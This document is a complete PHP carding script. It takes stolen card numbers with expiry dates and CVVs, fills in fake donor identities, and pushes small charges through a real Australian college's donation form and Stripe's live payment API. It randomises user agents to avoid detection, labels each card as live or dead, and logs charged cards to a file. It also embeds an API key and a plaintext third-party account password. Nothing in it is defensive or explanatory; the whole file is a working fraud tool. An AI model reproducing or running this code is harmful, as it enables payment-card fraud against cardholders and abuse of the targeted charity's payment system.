<?php

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
    
    function c($l){
    $x = '0123456789abcdefghijklmnopqrstuvwxyz';
    $y = strlen($x);
    $z = '';
  
  for ($i=0; $i<$l ; $i++) { 
   $z .= $x[rand(0, $y - 1)];
  }
    return $z;
  } 
$guid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$muid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
    
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$name = Getstr($resposta, '"first":"', '"');
$lname = Getstr($resposta, '"last":"', '"');
$phone = Getstr($resposta, '"phone":"', '"');
$zip = Getstr($resposta, '"postcode":', ',');
$state = Getstr($resposta, '"state":"', '"');
$email = Getstr($resposta, '"email":"', '"');
$city = Getstr($resposta, '"city":"', '"');
$street = Getstr($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);

      # ------------------ [ Webkit ] ------------------ #
      function RandomWebkit($length = 8)
      {
          $characters       = '0123456789abcdefghijklmnopqrstuvwxyz';
          $charactersLength = strlen($characters);
          $randomString     = '';
          for ($i = 0; $i < $length; $i++) {
              $randomString .= $characters[rand(0, $charactersLength - 1)];
          }
          return $randomString;
      }
      $wkt = RandomWebkit();


$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv  = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$timiss = (microtime(true) - $time_start);
$timiss = (round($timiss, 0)); 

  # [ 𝐑𝐄𝐓𝐑𝐘 & 𝐒𝐋𝐄𝐄𝐏 ]


  #  [ 𝐂𝐎𝐎𝐊𝐈𝐄𝐉𝐀𝐑 ]
 // if(!is_dir(getcwd()."/posty")) mkdir(getcwd()."/trish", 0755);
  //$gon = getcwd()."/trish/ganda".rand(1000000, 99999999).".txt";
									



  # [ 𝐑𝐀𝐍𝐃𝐎𝐌 𝐖𝐎𝐑𝐃 ]
 

  function GetRandomWord($len = 20) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
  }

  $Random = GetRandomWord();
  $formkey = substr(str_shuffle(mt_rand().mt_rand().$Random), 0, 32);
  $PrivateSession = substr(str_shuffle(mt_rand().mt_rand().$Random), 0, 32);
  $Webkit = substr(str_shuffle(mt_rand().mt_rand().$Random), 0, 16);
  $SessionId = substr(str_shuffle(mt_rand().mt_rand().$Random), 0, 26);

  $retry = 0;
   again:




$retry = 0;
do {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cmd.moore.edu.au/donate/?e=64060db3b4b88&donfrmid=20530');

curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'GET /donate/?e=64060db3b4b88&donfrmid=20530 HTTP/1.1';
$headers[] = 'Host: cmd.moore.edu.au';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: https://cmd.moore.edu.au/donate/?donfrmid=20530';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl = curl_exec($ch);
curl_close($ch);
 $curl;
$nonce = GetStr($curl, '"nonce":"','"');
$nonce2 = GetStr($curl, '"PROF_NONCE":"','"');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cmd.moore.edu.au/wp-admin/admin-ajax.php');

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /wp-admin/admin-ajax.php HTTP/1.1';
$headers[] = 'Host: cmd.moore.edu.au';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept: */*';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://cmd.moore.edu.au';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://cmd.moore.edu.au/donate/?e=64060db3b4b88&donfrmid=20530';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wfc_gateway_config&gatewayid=WFCBASE_SFI638354_MooreLive_stripe_a0m9o000000SsOmAAK&nonce='.$nonce.'');
$curl = curl_exec($ch);
curl_close($ch);
 $curl;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cmd.moore.edu.au/wp-admin/admin-ajax.php');

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /wp-admin/admin-ajax.php HTTP/1.1';
$headers[] = 'Host: cmd.moore.edu.au';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept: */*';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://cmd.moore.edu.au';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://cmd.moore.edu.au/donate/?e=64060db3b4b88&donfrmid=20530';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=clean_validate_donor&donation%5Bpdwp_amount%5D=&donation%5Bpdwp_custom_amount%5D=2&donation%5Bpdwp_donation_type%5D=one-off&donation%5Bdonor_type%5D=individual&donation%5Bdonor_title%5D=Mr&donation%5Bdonor_first_name%5D='.$name.'&donation%5Bdonor_last_name%5D='.$lname.'&donation%5Bdonor_email%5D='.$email.'&donation%5Bdonor_dialcode%5D=%2B6116508730750&donation%5Bdonor_phone%5D=%2B61+16508730750&donation%5Bdonor_address%5D=5232+NE+152nd+Place%2C+Account+No+45+182401&donation%5Bdonor_suburb%5D=Portland&donation%5Bdonor_state%5D=Oregon&donation%5Bdonor_postcode%5D=97230&donation%5Bdonor_country%5D=United+States&donation%5Bdonor_comment%5D=&donation%5Bpayment_gateway%5D=WFCBASE_SFI638354_MooreLive_stripe_a0m9o000000SsOmAAK&donation%5Bpayment_type%5D=credit_card&donation%5Bnonce%5D=39883c211a&donation%5Bdonation_sfinstance%5D=WFCBASE_SFI638354_MooreLive&donation%5Bdonation_campaign%5D=20530&donation%5Bdonation_formtitle%5D=Rectors+Development+Fund&donation%5Bdonation_formfilter%5D=&donation%5Bcurrency%5D=%24%2CAUD&donation%5Bcreditcard_type%5D=&donation%5Bcampaign_sourcemode%5D=&donation%5BcampaignId%5D=7019o0000009pODAAY&donation%5BgauId%5D=a0a2r000000tGWdAAM&donation%5BcampaignSessionId%5D=64061010acc29&donation%5Baction%5D=process_donate&donation%5Bgatewayid%5D=WFCBASE_SFI638354_MooreLive_stripe_a0m9o000000SsOmAAK&donation%5Bp%5D=19773&donation%5Bunique_token%5D='.$formkey.'&donation%5Bthankyou_url%5D=https%3A%2F%2Fcmd.moore.edu.au%2Fthank-you-donation%2F&donation%5Benable_validation%5D=true&donation%5Bgoogle_api_key%5D=AIzaSyCvRuwpTW8_-tqfLsxK-Gugb5TGZ8MpJSM&donation%5Bgoogle_prioritized_country%5D=&donation%5Bgoogle_prioritized_country_code%5D=&donation%5Bharmony_rapid_displaymode%5D=fieldmode&donation%5Bharmony_overridablefields%5D=false&donation%5Bharmony_rapid_sourceoftruth%5D=AUSOTS&donation%5Bharmony_rapid_username%5D=liongvincent277%40gmail.com&donation%5Bharmony_rapid_password%5D=!SHADOWking277&donation%5Bdonor_DPID%5D=&donation%5Bdonor_barcode%5D=&donation%5Bdonor_latitude%5D=&donation%5Bdonor_longitude%5D=&donation%5Bspinnerstyle%5D=background-size%3A18px+18px%3Bwidth%3A18px%3Bheight%3A18px%3Bmargin-top%3A18px%3B&donation%5Btemplate_color%5D=%23151cd8&donation%5Bwfc_cartdonationtypes%5D=&donation%5Bwfc_carttype%5D=not_cart&donation%5Bpdwp_sub_amt%5D=2&donation%5Bdonation_version%5D=v5&donation%5Badvance_cart_ver%5D=2.0&donation%5Bfield_error_notice_type%5D=fieldglow%2Csnackbar&donation%5Bdisable_initial_sync%5D=enabled&nonce='.$nonce.'');
$curl = curl_exec($ch);
curl_close($ch);
 $curl;



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /v1/payment_methods h2';
$headers[] = 'Host: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid='.$guid.'&muid='.$muid.'&pasted_fields=number&payment_user_agent=stripe.js%2F36d27f7e5c%3B+stripe-js-v3%2F36d27f7e5c&time_on_page=136433&key=pk_live_ff48PWCFP7VNmhbMBRDXOcTb');
$result = curl_exec($ch);
curl_close($ch);
 $result;
$id = GetStr($result, '"id": "','"');




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cmd.moore.edu.au/wp-admin/admin-ajax.php');

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /wp-admin/admin-ajax.php HTTP/1.1';
$headers[] = 'Host: cmd.moore.edu.au';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept: */*';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://cmd.moore.edu.au';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://cmd.moore.edu.au/donate/?e=64060db3b4b88&donfrmid=20530';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wfc_stripe_3d_secure_payment&gatewayid=WFCBASE_SFI638354_MooreLive_stripe_a0m9o000000SsOmAAK&param%5Bstatus%5D=success&param%5Bdonation%5D%5Bpdwp_amount%5D=&param%5Bdonation%5D%5Bpdwp_custom_amount%5D=2&param%5Bdonation%5D%5Bpdwp_donation_type%5D=one-off&param%5Bdonation%5D%5Bdonor_type%5D=individual&param%5Bdonation%5D%5Bdonor_title%5D=Mr&param%5Bdonation%5D%5Bdonor_first_name%5D='.$name.'&param%5Bdonation%5D%5Bdonor_last_name%5D='.$lname.'&param%5Bdonation%5D%5Bdonor_email%5D='.$email.'&param%5Bdonation%5D%5Bdonor_dialcode%5D=%2B6116508730750&param%5Bdonation%5D%5Bdonor_phone%5D=%2B61+16508730750&param%5Bdonation%5D%5Bdonor_address%5D=5232+NE+152nd+Place%2C+Account+No+45+182401&param%5Bdonation%5D%5Bdonor_suburb%5D=Portland&param%5Bdonation%5D%5Bdonor_state%5D=Oregon&param%5Bdonation%5D%5Bdonor_postcode%5D=97230&param%5Bdonation%5D%5Bdonor_country%5D=United+States&param%5Bdonation%5D%5Bdonor_comment%5D=&param%5Bdonation%5D%5Bpayment_gateway%5D=WFCBASE_SFI638354_MooreLive_stripe_a0m9o000000SsOmAAK&param%5Bdonation%5D%5Bpayment_type%5D=credit_card&param%5Bdonation%5D%5Bnonce%5D=39883c211a&param%5Bdonation%5D%5Bdonation_sfinstance%5D=WFCBASE_SFI638354_MooreLive&param%5Bdonation%5D%5Bdonation_campaign%5D=20530&param%5Bdonation%5D%5Bdonation_formtitle%5D=Rectors+Development+Fund&param%5Bdonation%5D%5Bdonation_formfilter%5D=&param%5Bdonation%5D%5Bcurrency%5D=%24%2CAUD&param%5Bdonation%5D%5Bcreditcard_type%5D=&param%5Bdonation%5D%5Bcampaign_sourcemode%5D=&param%5Bdonation%5D%5BcampaignId%5D=7019o0000009pODAAY&param%5Bdonation%5D%5BgauId%5D=a0a2r000000tGWdAAM&param%5Bdonation%5D%5BcampaignSessionId%5D=64061010acc29&param%5Bdonation%5D%5Baction%5D=process_donate&param%5Bdonation%5D%5Bgatewayid%5D=WFCBASE_SFI638354_MooreLive_stripe_a0m9o000000SsOmAAK&param%5Bdonation%5D%5Bp%5D=19773&param%5Bdonation%5D%5Bunique_token%5D='.$formkey.'&param%5Bdonation%5D%5Bthankyou_url%5D=https%3A%2F%2Fcmd.moore.edu.au%2Fthank-you-donation%2F&param%5Bdonation%5D%5Benable_validation%5D=true&param%5Bdonation%5D%5Bgoogle_api_key%5D=AIzaSyCvRuwpTW8_-tqfLsxK-Gugb5TGZ8MpJSM&param%5Bdonation%5D%5Bgoogle_prioritized_country%5D=&param%5Bdonation%5D%5Bgoogle_prioritized_country_code%5D=&param%5Bdonation%5D%5Bharmony_rapid_displaymode%5D=fieldmode&param%5Bdonation%5D%5Bharmony_overridablefields%5D=false&param%5Bdonation%5D%5Bharmony_rapid_sourceoftruth%5D=AUSOTS&param%5Bdonation%5D%5Bharmony_rapid_username%5D=liongvincent277%40gmail.com&param%5Bdonation%5D%5Bharmony_rapid_password%5D=!SHADOWking277&param%5Bdonation%5D%5Bdonor_DPID%5D=&param%5Bdonation%5D%5Bdonor_barcode%5D=&param%5Bdonation%5D%5Bdonor_latitude%5D=&param%5Bdonation%5D%5Bdonor_longitude%5D=&param%5Bdonation%5D%5Bspinnerstyle%5D=background-size%3A18px+18px%3Bwidth%3A18px%3Bheight%3A18px%3Bmargin-top%3A18px%3B&param%5Bdonation%5D%5Btemplate_color%5D=%23151cd8&param%5Bdonation%5D%5Bwfc_cartdonationtypes%5D=&param%5Bdonation%5D%5Bwfc_carttype%5D=not_cart&param%5Bdonation%5D%5Bpdwp_sub_amt%5D=2&param%5Bdonation%5D%5Bdonation_version%5D=v5&param%5Bdonation%5D%5Badvance_cart_ver%5D=2.0&param%5Bdonation%5D%5Bfield_error_notice_type%5D=fieldglow%2Csnackbar&param%5Bdonation%5D%5Bdisable_initial_sync%5D=enabled&param%5Bdonation%5D%5Bwfc_donation_tokenize%5D=true&param%5Bdonation%5D%5Btimestamp%5D=1678119065&param%5Bdonation%5D%5Bstatus%5D=pending&param%5Bdonation%5D%5Bpost_meta_id%5D=185489&param%5Bdonation%5D%5Bpamynet_ref%5D=1678119065-1600113079-185489&param%5Bdonation%5D%5Bdonation_logs_id%5D=20955&nonce='.$nonce.'&token='.$id.'');
 $site = curl_exec($ch);

 $site;
  # [ 𝐒𝐓𝐑𝐈𝐏𝐄 ]
  
$pi = GetStr($site, '"paymentIntent":"','"');
$cs = GetStr($site, '"clientSecret":"','"');
$msg22 = GetStr($site, '"errors":["Error Code : 0","','"]');

 $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);

  if($httpcode == 200) {
    $site;
    break;
  } else {
    echo "No response received. Retrying...\n";
    $retry++;
    sleep(1);
  }
} while($retry < 5);



  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.google.com/");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  
  $result = curl_exec($ch);
 


  
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'/confirm');

curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]=&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=f36c42c5-ae3b-4d01-9091-d26de0a0239658b749&payment_method_data[muid]=1c4d8e93-d2bb-4c6f-8e78-753b18c37e7f6dd163&payment_method_data[sid]=2b54d4d3-90da-49d3-b142-4531857380e5d52bec&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F36d27f7e5c%3B+stripe-js-v3%2F36d27f7e5c&payment_method_data[time_on_page]=140763&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_ff48PWCFP7VNmhbMBRDXOcTb&client_secret='.$cs.'');
$last = curl_exec($ch);
curl_close($ch);

$lastR = Getstr($last,'"code": "','"');
$stats = Getstr($last,'"status": "','"');
echo $idd = GetStr($last, '"type": "','"');

 $last;
 "<br>";
 "<br>";
###############4th




########   RESPONSE   ########
########   SUCCESS   ########


if (strpos($last, '"status": "succeeded"')) {
    echo '<font color=green>CHARGED</span>  </span>:  '.$lista.'</span>  <br>➤ Payment Successfully  <br>➤ Amount :  $1<br>';
 fwrite(fopen('ccncharge.txt', 'a'), $lista."\r\n");
exit;
}if($retry >= 100)
{ 
echo '<span class="badge badge-danger">DEAD</span>'.$lista.'<span style="color:red;"><br>EMPTY</span><br>'; 
}elseif (strpos($result, '""errors":["Error Code : 0","Message : Could not connect to Stripe (https:\/\/api.stripe.com\/v1\/customers). Please check your internet connection and try again. If this problem persists, you should check Stripe service status at https:\/\/twitter.com\/stripestatus, or let us know at support@stripe.com.\n\n(Network error [errno 6]: getaddrinfo() thread failed to start\n)"]') !== false) {
$retry++; 
goto again;
}
########   CVV   ########

else if (strpos($last, '"transaction_not_allowed"')) {
    echo "<font color=green><b>CCN $lista<br>transaction_not_allowed<br>";
}
else if (strpos($last, '"insufficient_funds"')) {
    echo "<font color=green><b>CVV $lista<br>insufficient_funds<br>";
}
else if (strpos($result, '"insufficient_funds"')) {
    echo "<font color=green><b>CVV $lista<br>insufficient_funds<br>";
}
else if (strpos($site, '"errors":["Error Code : 0","Message : Your card has insufficient funds."]')) {
    echo "<font color=green><b>CVV $lista<br>insufficient_funds<br>";
}
else if (strpos($site, '"errors":["Error Code : 0","Message : Your card has insufficient funds."')) {
    echo "<font color=green><b>CVV $lista<br>insufficient_funds 2²<br>";
}
########   CCN   ########
else if (strpos($site, '"errors":["Error Code : 0","Message : Your card security code is incorrect."')) {
    echo "<font color=green><b>CCN $lista<br>Your card's security code is incorrect. 2²<br>";
}
else if(strpos($result, 'security code is incorrect.')) {
    echo "<font color=green><b>CCN $lista<br>Your card's security code is incorrect.<br>";
}
else if(strpos($last, 'incorrect_cvc')) {
    echo "<font color=green><b>CCN $lista<br>Your card's security code is incorrect.<br>";
}
########   DEAD   ########
else if(strpos($result, '"Invalid account."')) {
    echo "<font color=red><b>DEAD $lista<br>Invalid account.<br>";
}
else if(strpos($result, '"Your card has expired."')) {
    echo "<font color=red><b>DEAD $lista<br>Your card has expired.<br>";
}
else if(strpos($result, '"status": "requires_action"')) {
    echo "<font color=red><b>DEAD $lista<br>requires_action<br>";
}
else if(strpos($result, '"Your card does not support this type of purchase."')) {
    echo "<font color=red><b>DEAD $lista<br>Your card does not support this type of purchase.<br>";
}
else if(strpos($result, '"Your card number is incorrect."')) {
    echo "<font color=red><b>DEAD $lista<br>Your card number is incorrect.<br>";
}
else if(strpos($result, '"Your card was declined."')) {
    echo "<font color=red><b>DEAD $lista<br>Your card was declined.<br>";
}
else if(strpos($last, 'generic_decline')) {
    echo "<font color=red><b>DEAD $lista<br>generic_decline<br>";
}

else if(strpos($last, 'fraudulent')) {
    echo "<font color=red><b>DEAD $lista<br>fraudulent<br>";
}
else if(strpos($last, 'do_not_honor')) {
    echo "<font color=red><b>DEAD $lista<br>do_not_honor<br>";
}else if(strpos($last, '"status": "requires_action"')) {
    echo "<font color=red><b>DEAD $lista<br>VBV/OTP<br>";
}else if(strpos($last, 'incorrect_number')) {
    echo "<font color=red><b>DEAD $lista<br>incorrect_number<br>";
}else if(strpos($last, '"message": "Unrecognized request URL (GET: /v1/payment_intents/). If you are trying to list objects, remove the trailing slash. If you are trying to retrieve an object, make sure you passed a valid (non-empty) identifier in your code. Please see https://stripe.com/docs or we can help at https://support.stripe.com/."')) {
    echo "<font color=red><b>DEAD $lista<br>NonVbv/Declined $msg2 <br>";
}else if (strpos($last, '"status": "succeeded')) {
    echo "<font color=green><b>CCN<br>Success<br>";
}
else {
  echo "<font color=red><b>DEAD $lista<br>$lastR $result3 $msg22 $stats<br>";
}





  # [ 𝐃𝐎𝐍𝐄 ]

  unset($ch);
//  unlink($gon);
  flush();
  ob_flush();
  ob_end_flush();

  # [ 𝐂𝐋𝐎𝐒𝐄 ]  
  
  
?>


